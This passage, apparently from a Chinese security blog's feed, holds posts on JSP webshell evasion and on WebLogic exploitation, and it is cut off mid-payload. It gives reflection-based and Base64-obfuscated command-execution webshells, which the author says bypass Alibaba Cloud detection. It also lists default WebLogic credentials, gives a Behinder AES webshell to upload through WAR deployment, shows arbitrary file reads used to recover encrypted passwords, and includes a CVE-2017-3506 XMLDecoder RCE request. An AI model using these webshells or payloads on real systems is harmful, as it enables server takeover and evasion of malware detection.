tWr]]&gt;&amp;#x69;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x29;&amp;#x2E;&amp;#x70;&amp;#x72;&amp;#x69;&amp;#x6E;&amp;#x74;&amp;#x6C;&amp;#x6E;&amp;#x28;&amp;#x72;&amp;#x29;&amp;#x3B;<br>&amp;#x20;&amp;#x20;&amp;#x7D;<br>&lt;/jsp:scriptlet&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><p>如果用这个captfEncoder工具去编码，勾选如下：</p><p><img src="/../../blog_image/image-20240527105254496.png" alt="image-20240527105254496"></p><h1 id="反射调用："><a href="#反射调用：" class="headerlink" title="反射调用："></a>反射调用：</h1><h2 id="基本反射："><a href="#基本反射：" class="headerlink" title="基本反射："></a>基本反射：</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br><br>  <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br><br>  Class&lt;?&gt; rt =Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>  <span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>  <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>  <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> method.invoke(runtimeMethod.invoke(<span class="hljs-literal">null</span>),cmd);<br>  <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) object;<br><br>  <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br>  <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in);<br>  <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(resultReader);<br>  <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>    out.println(s);<br>  &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="base64混淆api："><a href="#base64混淆api：" class="headerlink" title="base64混淆api："></a>base64混淆api：</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(<span class="hljs-string">&quot;Y21k&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br>    Class&lt;?&gt; rt =Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(<span class="hljs-string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(<span class="hljs-string">&quot;Z2V0UnVudGltZQ==&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(<span class="hljs-string">&quot;ZXhlYw==&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>), String.class);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> method.invoke(runtimeMethod.invoke(<span class="hljs-literal">null</span>),cmd);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) object;<br><br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        response.getWriter().println(r);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>如果发现还是被杀，可以使用<code>getDeclaredMethod</code>这个方法：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;Y21k&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br>    Class&lt;?&gt; rt =Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br>    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> rt.getDeclaredMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;Z2V0UnVudGltZQ==&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>));<br>    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> rt.getDeclaredMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;ZXhlYw==&quot;</span>),<span class="hljs-string">&quot;utf-8&quot;</span>), String.class);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> method.invoke(runtimeMethod.invoke(<span class="hljs-literal">null</span>),cmd);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) object;<br>    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> process.getInputStream();<br>    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(is));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span>((r = bufferedReader.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>        response.getWriter().println(r);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>在结合unicode编码，采用不同的u长度，即可绕过阿里云的检测。</p><p>这里推荐一个好的混淆项目，可以bypass阿里云（今天实测，2024.5.27）</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://tttang.com/archive/1739/">java免杀合集 - 跳跳糖 (tttang.com)</a></p><p><a href="https://ti.aliyun.com/#/overview">阿里云恶意文件检测平台 - 首页 (aliyun.com)</a></p><p><a href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/">星球问答：一次jsp上传绕过的思考 - (yzddmr6.com)</a></p><p><a href="https://xz.aliyun.com/t/11368?u_atoken=c312dd1b6eaa78df5205fcb50b23ce67&u_asession=01IxB16vDU6nGiHUpclhuURHTESkLbuj6jKj1g394yJTNJETjZnkvcjZbHlqPhtiYPdlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=0533lpVzDmIog6XXlT4LSgRvVtdr8vjnYdAfa-kWf3Hax6PxhC6Dm7r1dY7ay_-MRPE4sGiWFoqlh8R0Y8jfJqQkHfVBWToFEKBt9eoX1Rr7CGDNPFzKHGcYS7eqtM2d92gRBEf_Nd-CidI2wnD6mLuk6xaqvBMkSGG9TmarDjbUZg2QMxYs6lyXb1lFWKql56CG9ypu9seynQs26EgfbZd9pkIpN4rxdhwT3yEJ7FNPL1HoqvNudRrP4cKy8zHTbns2v66jBjVtbzmuD-uiNBxopqaPLCyN1d1STgiD9274N6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=5wjQgYhvYuZBlE33mmtuQpKgQnI=">实战分析某红队魔改哥斯拉Webshell - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>webshell免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring漏洞复现与利用</title>
    <link href="/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/Srping/Spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/Srping/Spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>weblogic漏洞复现与利用</title>
    <link href="/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/weblogic/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/weblogic/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><p>一般默认端口是7001</p><p>常见的封面如下：</p><p><img src="/../../../blog_image/image-20240501170915933-1717164228329-1.png" alt="image-20240501170915933"></p><p>404特征：</p><p><img src="/../../../blog_image/image-20240507140905081.png" alt="image-20240507140905081"></p><h1 id="1-weak："><a href="#1-weak：" class="headerlink" title="1. weak："></a>1. weak：</h1><p>这里吐槽以下，这个镜像是真的大啊。</p><p><img src="/../../../blog_image/image-20240501171037690-1717164228330-3.png" alt="image-20240501171037690"></p><h2 id="1-1-弱口令："><a href="#1-1-弱口令：" class="headerlink" title="1.1 弱口令："></a>1.1 弱口令：</h2><p>访问<a href="http://ip:7001/console">http://ip:7001/console</a></p><p><img src="/../../../blog_image/image-20240502120321734-1717164228330-2.png" alt="image-20240502120321734"></p><p>常见的弱口令有这些：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">system:</span>password<br><span class="hljs-symbol">weblogic:</span>weblogic<br><span class="hljs-symbol">admin:</span>secruity<br><span class="hljs-symbol">joe:</span>password<br><span class="hljs-symbol">mary:</span>password<br><span class="hljs-symbol">system:</span>sercurity<br><span class="hljs-symbol">wlcsystem:</span> wlcsystem<br><span class="hljs-symbol">weblogic:</span>Oracle<span class="hljs-subst">@123</span><br></code></pre></td></tr></table></figure><p>这里注意一下不能使用bp抓包去爆破，错误密码5次之后就会自动锁定。</p><p>这里的账号和密码是weblogic&#x2F;Oracle@123，登陆成功：</p><p><img src="/../../../blog_image/image-20240502120838199-1717164228330-6.png" alt="image-20240502120838199"></p><p>ps：如果浏览器中打开是这样：</p><p><img src="/../../../blog_image/image-20240504201026141-1717164228330-4.png" alt="image-20240504201026141"></p><p>那可能是下载了插件导致的，建议关闭插件，不然本机是无法访问的。</p><h2 id="1-2-任意文件上传："><a href="#1-2-任意文件上传：" class="headerlink" title="1.2 任意文件上传："></a>1.2 任意文件上传：</h2><p>上传webshell：</p><p>点击部署(Deployments)：</p><p><img src="/../../../blog_image/image-20240502120934236-1717164228330-7.png" alt="image-20240502120934236"></p><p>点击安装：</p><p><img src="/../../../blog_image/image-20240502155624221-1717164228330-5.png" alt="image-20240502155624221"></p><p>上传文件：</p><p><img src="/../../../blog_image/image-20240502155714013-1717164228330-8.png" alt="image-20240502155714013"></p><p>或者直接上传一个冰蝎马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar -cvf a.war .<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240502160248341-1717164228330-9.png" alt="image-20240502160248341"></p><p>上传后点击下一步：(注意这里的下一步是点上面的，后面都是点上面的)</p><p><img src="/../../../blog_image/image-20240502163234217-1717164228330-10.png" alt="image-20240502163234217"></p><p>然后一直点下一步，直到这里，点finish</p><p><img src="/../../../blog_image/image-20240502163339077-1717164228330-11.png" alt="image-20240502163339077"></p><p>回到主页看到后即可：</p><p><img src="/../../../blog_image/image-20240502163354439-1717164228330-12.png" alt="image-20240502163354439"></p><p>这里实测，冰蝎4.0生成的default_aes的马子是不行的，4.0连不上。</p><p><img src="/../../../blog_image/image-20240504201157627-1717164228330-13.png" alt="image-20240504201157627"></p><p>冰蝎3.0是可能访问的：</p><p><img src="/../../../blog_image/image-20240504201336665-1717164228330-14.png" alt="image-20240504201336665"></p><p>这里建议使用3.0生成的马子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br>%&gt;&lt;%<br>    <span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br>        session.putValue(<span class="hljs-string">&quot;u&quot;</span>, k);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>        c.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="1-3-任意文件读取："><a href="#1-3-任意文件读取：" class="headerlink" title="1.3 任意文件读取："></a>1.3 任意文件读取：</h2><p>任意读取文件获取用户名密码，weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>（基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>）。</p><p>在这个靶场中模拟了一个任意文件读取的操作，访问<code>/hello/file.jsp?path=[文件路径]</code></p><p>在burp suite的HTTP history取一个GET请求记录右击send to Repeater，在请求URL修改为<code>/hello/file.jsp?path=security/SerializedSystemIni.dat</code>，点Send按钮发送请求，在响应页面会看到如下一段乱码。</p><p><img src="/../../../blog_image/image-20240507141718523.png" alt="image-20240507141718523"></p><p>点击hex，然后对乱码部分选中后右键点击保存在文件中：</p><p><img src="/../../../blog_image/image-20240507142420288.png" alt="image-20240507142420288"></p><p>同理访问：<code>/hello/file.jsp?path=config/config.xml</code>，然后在响应包中找到<code>node-manager-password-encrypted</code>：</p><p><img src="/../../../blog_image/image-20240507142654384.png" alt="image-20240507142654384"></p><p>使用weblogic解密工具，或者在线的aes解密：</p><p>(这里又踩坑了，这个软件好像只有java8才可以解密，java17是不行的。)</p><p><img src="/../../../blog_image/image-20240507143252298.png" alt="image-20240507143252298"></p><h1 id="2-XMLDecoder反序列化漏洞（CVE-2017-3506）："><a href="#2-XMLDecoder反序列化漏洞（CVE-2017-3506）：" class="headerlink" title="2. XMLDecoder反序列化漏洞（CVE-2017-3506）："></a>2. XMLDecoder反序列化漏洞（CVE-2017-3506）：</h1><h2 id="2-1-漏洞简述："><a href="#2-1-漏洞简述：" class="headerlink" title="2.1 漏洞简述："></a>2.1 漏洞简述：</h2><p>XMLDecoder反序列化漏洞(CVE-2017-3506)</p><h2 id="2-2-漏洞原理："><a href="#2-2-漏洞原理：" class="headerlink" title="2.2 漏洞原理："></a>2.2 漏洞原理：</h2><p>在&#x2F;wls-wsat&#x2F;CoordinatorPortType（POST）处构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。</p><p>代码如下：</p><p>WorkContextXmlInputAdapter中调用了XMLDecoder，即xml反序列化：</p><p><img src="/../../../blog_image/image-20240502171053165-1717164228330-15.png" alt="image-20240502171053165"></p><h2 id="2-3-漏洞复现："><a href="#2-3-漏洞复现：" class="headerlink" title="2.3 漏洞复现："></a>2.3 漏洞复现：</h2><p>同样使用week_pass的镜像，版本10.3.6也存在这个漏洞。</p><p>可以通过访问如下目录，可以判断是否存在wls-wsat组件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationPortTypeRPC<br><span class="hljs-regexp">/wls-wsat/</span>ParticipantPortType<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationRequesterPortType<br><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType11<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationPortTypeRPC11<br><span class="hljs-regexp">/wls-wsat/</span>ParticipantPortType11<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationRequesterPortType11<br></code></pre></td></tr></table></figure><p>存在回显</p><p><img src="/../../../blog_image/image-20240502171506025-1717164228330-16.png" alt="image-20240502171506025"></p><p>点击该url后抓包：</p><p><img src="/../../../blog_image/image-20240502171943285-1717164228330-17.png" alt="image-20240502171943285"></p><h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p>将这个get改成post，添加Content-Type: text&#x2F;xml和post的body，内容是touch &#x2F;tmp&#x2F;123：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> 192.168.48.128:7001<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.48.128:7001/wls-wsat/CoordinatorPortType<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ADMINCONSOLESESSION=8M1wmzhJ3XpGTZ1HgWhcl1vGwgYM7kJvKfBzXG0w8rZPW4hvdXmS!-74538526<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>814<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_131&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch /tmp/123<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span 